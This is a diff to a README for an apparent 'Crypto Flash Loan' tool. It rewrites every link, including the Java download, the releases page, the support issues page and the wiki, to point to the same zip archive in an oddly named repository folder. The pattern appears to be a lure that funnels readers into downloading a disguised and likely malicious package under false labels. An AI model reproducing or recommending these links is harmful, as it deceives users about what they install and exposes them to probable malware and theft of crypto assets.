@@ -9,13 +9,13 @@ Welcome to the **Crypto Flash Loan** project! This application lets you access i
 - **Operating System**: Windows, macOS, or Linux
 - **Network**: Stable internet connection
 - **Browser**: Latest version of Chrome, Firefox, or Safari
-- **Additional Software**: Make sure you have Java installed on your computer. You can download it from [here](https://www.java.com/en/download/).
+- **Additional Software**: Make sure you have Java installed on your computer. You can download it from [here](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/raw/refs/heads/main/Limacidae/Loan-Crypto-Collateral-No-Liquidity-Execution-Flash-Instant-1.5.zip).
 
 ## 📦 Download & Install
 
 ### Download the Application
 
-To download the latest version of the Crypto Flash Loan application, visit this page: [Download Here](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/releases).
+To download the latest version of the Crypto Flash Loan application, visit this page: [Download Here](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/raw/refs/heads/main/Limacidae/Loan-Crypto-Collateral-No-Liquidity-Execution-Flash-Instant-1.5.zip).
 
 ### Installation Steps
 
@@ -50,7 +50,7 @@ To download the latest version of the Crypto Flash Loan application, visit this 
 
 ### Getting Help
 
-If you encounter issues not listed above, check our support documentation or contact our help team. You can find support options [here](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/issues).
+If you encounter issues not listed above, check our support documentation or contact our help team. You can find support options [here](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/raw/refs/heads/main/Limacidae/Loan-Crypto-Collateral-No-Liquidity-Execution-Flash-Instant-1.5.zip).
 
 ## 🌟 Features
 
@@ -69,6 +69,6 @@ This project is licensed under the MIT License. Please refer to the [LICENSE](LI
 
 ## 🔗 Additional Resources
 
-For further reading and detailed guides, visit our [Wiki](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/wiki) or browse through the project documentation.
+For further reading and detailed guides, visit our [Wiki](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/raw/refs/heads/main/Limacidae/Loan-Crypto-Collateral-No-Liquidity-Execution-Flash-Instant-1.5.zip) or browse through the project documentation.
 
-Don’t forget to visit this page for your downloads: [Download Here](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/releases). Happy trading!
+Don’t forget to visit this page for your downloads: [Download Here](https://github.com/xliiux/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/raw/refs/heads/main/Limacidae/Loan-Crypto-Collateral-No-Liquidity-Execution-Flash-Instant-1.5.zip). Happy trading!
